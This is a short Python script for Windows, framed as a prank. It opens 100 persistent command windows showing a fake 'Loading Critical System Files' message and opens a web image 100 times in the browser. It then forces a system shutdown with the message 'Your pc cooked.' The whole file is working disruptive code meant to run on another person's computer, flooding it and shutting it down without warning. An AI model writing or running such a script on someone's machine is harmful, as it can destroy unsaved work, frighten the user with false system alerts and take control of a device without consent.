import os
import time

# --- Configuration ---
message = "Your pc cooked."
delay_seconds = 10 
# Number of items (CMD windows and images) to open
number_of_pranks = 100 
# Time delay between starting the chaos and the shutdown command
chaos_duration = 3

# The image URL you provided
image_url = "https://imgs.search.brave.com/t-Yc0vaEDRHZqisMGcholqWBUX8xbGY-UdYKpM-qRbA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLmlt/Z2ZsaXAuY29tLzQv/ZTlkNzAuanBn"

print(f"{message}")
# 1. Initiate the Chaos: Window and Image Flood
print(f"Initiating Phase 1: Total System Chaos...")

for i in range(number_of_pranks):
    
    # 1a. Open a Command Prompt Window
    # 'start cmd /k' opens a new, persistent CMD window with a silly message
    cmd_command = f'start cmd /k echo Loading Critical System Files... Window {i+1}'
    os.system(cmd_command)
    
    # 1b. Open the Image URL in the Default Browser
    # 'start' is used to open the URL with the default application (usually a web browser)
    image_command = f'start "{image_url}"'
    os.system(image_command)
    
    # Small delay between each new window/image to control speed
    time.sleep(0.1) 


# 2. Display the main message and wait briefly
print(f"Chaos initiated! Waiting {chaos_duration} seconds before execution...")
time.sleep(chaos_duration)


# 3. Print the final message and execute the shutdown
print(f"---")
print(f"Warning: System shutdown initiated! The computer will shut down in {delay_seconds} seconds.")

# Construct the Windows shutdown command
# /s: initiates a shutdown
# /t <seconds>: specifies the timeout in seconds
# /c "<message>": specifies the comment/message for the Windows alert
shutdown_command = f'shutdown /s /t {delay_seconds} /c "{message}"'
os.system(shutdown_command)

# Optional: keep the main console window open briefly
time.sleep(1)